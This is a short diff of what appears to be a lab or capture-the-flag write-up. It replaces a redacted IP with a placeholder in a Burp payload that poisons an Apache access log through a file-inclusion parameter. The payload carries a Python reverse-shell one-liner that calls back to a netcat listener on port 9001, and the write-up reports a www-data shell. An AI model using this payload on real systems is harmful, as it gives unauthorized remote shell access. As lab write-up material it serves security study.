@@ -161,7 +161,7 @@ nc -lvnp 9001
 
 Burp payload:
 ```
-file=%2Fvar%2Flog%2Fapache2%2Faccess.log&cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("***REMOVED***",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+file=%2Fvar%2Flog%2Fapache2%2Faccess.log&cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_TUN0_IP>",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 ```
 
 Shell received as `www-data`.
